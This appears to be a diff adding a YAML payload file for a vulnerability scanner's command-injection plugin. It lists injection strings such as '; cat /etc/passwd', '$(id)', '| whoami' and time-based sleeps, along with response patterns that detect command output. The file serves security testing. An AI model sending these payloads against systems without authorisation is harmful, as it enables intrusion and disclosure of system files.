@@ -1,0 +1,99 @@
+# CMDi (Command Injection) Payloads Database
+# Plugin: core.injection.cmdi
+
+plugin_id: core.injection.cmdi
+mutation_type: field_injection
+payload_type: cmdi
+
+variants:
+  - id: semicolon_injection
+    payloads:
+      - "; id"
+      - "; whoami"
+      - "; uname -a"
+      - "; cat /etc/passwd"
+    tech_stack: [linux, unix]
+    confidence_boost: 0.12
+    detection: body_matches_any(uid=, gid=, root:)
+
+  - id: pipe_injection
+    payloads:
+      - "| id"
+      - "| whoami"
+      - "| hostname"
+      - "|| id"
+    tech_stack: [linux, unix, windows]
+    confidence_boost: 0.12
+    detection: body_matches_any(uid=, gid=, root:)
+
+  - id: backtick_substitution
+    payloads:
+      - "`id`"
+      - "`whoami`"
+      - "`uname -a`"
+    tech_stack: [linux, unix]
+    confidence_boost: 0.10
+    detection: body_matches_any(uid=, gid=)
+
+  - id: dollar_substitution
+    payloads:
+      - "$(id)"
+      - "$(whoami)"
+      - "$(uname -a)"
+      - "$(cat /etc/passwd)"
+    tech_stack: [linux, unix]
+    confidence_boost: 0.10
+    detection: body_matches_any(uid=, gid=, root:)
+
+  - id: windows_injection
+    payloads:
+      - "& whoami"
+      - "| whoami"
+      - "& ipconfig"
+      - "& dir"
+    tech_stack: [windows]
+    confidence_boost: 0.10
+    detection: body_matches_any(Windows, Administrator, C:\\)
+
+  - id: time_based_blind
+    payloads:
+      - "; sleep 5"
+      - "| sleep 5"
+      - "& timeout /t 5"
+      - "`sleep 5`"
+    tech_stack: [linux, unix, windows]
+    detection: timing_delta > 4000
+    confidence_boost: 0.15
+
+  - id: encoded_injection
+    payloads:
+      - "%3B%20id"
+      - "%7C%20whoami"
+      - "%24%28id%29"
+    tech_stack: [linux, unix]
+    confidence_boost: 0.13
+    detection: body_matches_any(uid=, gid=)
+
+keywords:
+  - cmd
+  - exec
+  - command
+  - run
+  - ping
+  - host
+  - ip
+  - query
+  - shell
+  - execute
+  - process
+  - system
+
+expected_results:
+  semicolon_injection:
+    indicator: command_output_leaked
+  pipe_injection:
+    indicator: command_output_leaked
+  time_based_blind:
+    indicator: timing_anomaly
+  windows_injection:
+    indicator: windows_command_output
